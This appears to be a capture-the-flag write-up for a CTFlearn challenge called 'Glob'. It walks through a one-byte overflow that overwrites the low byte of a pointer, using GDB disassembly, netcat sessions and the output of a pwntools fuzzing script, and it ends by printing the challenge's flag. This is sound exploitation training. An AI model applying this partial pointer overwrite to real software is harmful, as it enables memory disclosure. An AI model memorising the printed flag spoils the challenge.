# Glob

Looking at the given code in `task.c`, we see that our target is the `flag` value in the `program_data` `struct`.

We are able to enter data in the following lines:

```
printf("Your name? ");
  
program_data.message = program_data.username;
read(STDIN_FILENO, program_data.username, 33);
puts(program_data.message);
```

The key vulnerability at play comes when `program_data.message` is set equal to `program_data.username` and then reads from `STDIN_FILENO`. From the code:

```
struct __attribute__((__packed__)) {
    char flag[32];
    char username[32];
    char *message;
} program_data;
```

The `read` command is allowing for 33 characters, when `program_data.username` only allows for 32. If we enter strings of more than 32 digits into the `nc` link, we get odd results:

```
~$ nc rivit.dev 10022
Your name? aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
{-y

~$ nc rivit.dev 10022
Your name? aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
iv

~$ nc rivit.dev 10022
Your name? aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Iu

~$ nc rivit.dev 10022
Your name? aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
kJ|
```

Here, we have an Out-of-Bounds read vulnerability. A little research tells us that the expected behvior of such a vulnerability is unpredictable, so we try to run the given executable in GDB to ascertain the behavior.

If we `disas read_flag`:

```
gdb-peda$ disas read_flag
Dump of assembler code for function read_flag:
   0x00000000004011f6 <+0>:     endbr64
   0x00000000004011fa <+4>:     push   rbp
   0x00000000004011fb <+5>:     mov    rbp,rsp
   0x00000000004011fe <+8>:     sub    rsp,0x10
   0x0000000000401202 <+12>:    lea    rax,[rip+0xdfb]        # 0x402004
   0x0000000000401209 <+19>:    mov    rsi,rax
   0x000000000040120c <+22>:    lea    rax,[rip+0xdf4]        # 0x402007
   0x0000000000401213 <+29>:    mov    rdi,rax
   0x0000000000401216 <+32>:    call   0x401100 <fopen@plt>
   0x000000000040121b <+37>:    mov    QWORD PTR [rbp-0x8],rax
   0x000000000040121f <+41>:    cmp    QWORD PTR [rbp-0x8],0x0
   0x0000000000401224 <+46>:    je     0x40124f <read_flag+89>
   0x0000000000401226 <+48>:    mov    rax,QWORD PTR [rbp-0x8]
   0x000000000040122a <+52>:    mov    rdx,rax
   0x000000000040122d <+55>:    mov    esi,0x20
   0x0000000000401232 <+60>:    lea    rax,[rip+0x2e47]        # 0x404080 <program_data>
   0x0000000000401239 <+67>:    mov    rdi,rax
   0x000000000040123c <+70>:    call   0x4010e0 <fgets@plt>
   0x0000000000401241 <+75>:    mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000401245 <+79>:    mov    rdi,rax
   0x0000000000401248 <+82>:    call   0x4010b0 <fclose@plt>
   0x000000000040124d <+87>:    jmp    0x401250 <read_flag+90>
   0x000000000040124f <+89>:    nop
   0x0000000000401250 <+90>:    leave
   0x0000000000401251 <+91>:    ret
End of assembler dump.
```

We see that flag is at `0x404080`, and if we `disas main`:

```
gdb-peda$ disas main
Dump of assembler code for function main:
   0x0000000000401252 <+0>:     endbr64
   0x0000000000401256 <+4>:     push   rbp
   0x0000000000401257 <+5>:     mov    rbp,rsp
   0x000000000040125a <+8>:     sub    rsp,0x10
   0x000000000040125e <+12>:    mov    DWORD PTR [rbp-0x4],edi
   0x0000000000401261 <+15>:    mov    QWORD PTR [rbp-0x10],rsi
   0x0000000000401265 <+19>:    mov    rax,QWORD PTR [rip+0x2df4]        # 0x404060 <stdout@GLIBC_2.2.5>
   0x000000000040126c <+26>:    mov    ecx,0x0
   0x0000000000401271 <+31>:    mov    edx,0x2
   0x0000000000401276 <+36>:    mov    esi,0x0
   0x000000000040127b <+41>:    mov    rdi,rax
   0x000000000040127e <+44>:    call   0x4010f0 <setvbuf@plt>
   0x0000000000401283 <+49>:    mov    rax,QWORD PTR [rip+0x2de6]        # 0x404070 <stdin@GLIBC_2.2.5>
   0x000000000040128a <+56>:    mov    ecx,0x0
   0x000000000040128f <+61>:    mov    edx,0x2
   0x0000000000401294 <+66>:    mov    esi,0x0
   0x0000000000401299 <+71>:    mov    rdi,rax
   0x000000000040129c <+74>:    call   0x4010f0 <setvbuf@plt>
   0x00000000004012a1 <+79>:    mov    eax,0x0
   0x00000000004012a6 <+84>:    call   0x4011f6 <read_flag>
   0x00000000004012ab <+89>:    lea    rax,[rip+0xd60]        # 0x402012
   0x00000000004012b2 <+96>:    mov    rdi,rax
   0x00000000004012b5 <+99>:    mov    eax,0x0
   0x00000000004012ba <+104>:   call   0x4010c0 <printf@plt>
   0x00000000004012bf <+109>:   lea    rax,[rip+0x2dda]        # 0x4040a0 <program_data+32>
   0x00000000004012c6 <+116>:   mov    QWORD PTR [rip+0x2df3],rax        # 0x4040c0 <program_data+64>
   0x00000000004012cd <+123>:   mov    edx,0x21
   0x00000000004012d2 <+128>:   lea    rax,[rip+0x2dc7]        # 0x4040a0 <program_data+32>
   0x00000000004012d9 <+135>:   mov    rsi,rax
   0x00000000004012dc <+138>:   mov    edi,0x0
   0x00000000004012e1 <+143>:   call   0x4010d0 <read@plt>
   0x00000000004012e6 <+148>:   mov    rax,QWORD PTR [rip+0x2dd3]        # 0x4040c0 <program_data+64>
   0x00000000004012ed <+155>:   mov    rdi,rax
   0x00000000004012f0 <+158>:   call   0x4010a0 <puts@plt>
   0x00000000004012f5 <+163>:   mov    eax,0x0
   0x00000000004012fa <+168>:   leave
   0x00000000004012fb <+169>:   ret
End of assembler dump.
```

We see (from the `puts` command) that `message` is at `0x4040c0`. Now, if we add breakpoints before and after reading the user input (in this case, I used 'a' repeated 33 times),

```
gdb-peda$ p *0x4040c0
$9 = 0x0
```

Which became:

```
gdb-peda$ p *0x4040c0
$9 = 0x404061
```

To test, we repeat with the last character changed to 'b':

```
gdb-peda$ p *0x4040c0
$11 = 0x404062
```

Since 'a' in hex is `0x61`, we have overwritten the last byte of `program_data.message`. However, we need to point to `0x404080`. For this, I wrote `fuzz.py` (included in this folder) which sent a repeated string of `\x80` to the remote server. This resulted in:

```
$ python fuzz.py
[*] '/mnt/c/Users/Brian/Documents/Coding/CTFLearn/Easy/Glob/task/task'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Opening connection to rivit.dev on port 10022: Done
/mnt/c/Users/Brian/Documents/Coding/CTFLearn/Easy/Glob/fuzz.py:12: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  conn.recvuntil("Your name? ")
/mnt/c/Users/Brian/Documents/Coding/CTFLearn/Easy/Glob/fuzz.py:13: BytesWarning: Text is not bytes; assuming ISO-8859-1, no guarantees. See https://docs.pwntools.com/#bytes
  conn.sendline(payload)
[+] Receiving all data: Done (32B)
[*] Closed connection to rivit.dev port 10022
output b'CTFlearn{p4rt14l_ptr_0v3rwr1t3}\n'
```

With a flag value of `CTFlearn{p4rt14l_ptr_0v3rwr1t3}`.

## References

[CWE-125: Out-of-bounds Read](https://cwe.mitre.org/data/definitions/125.html)
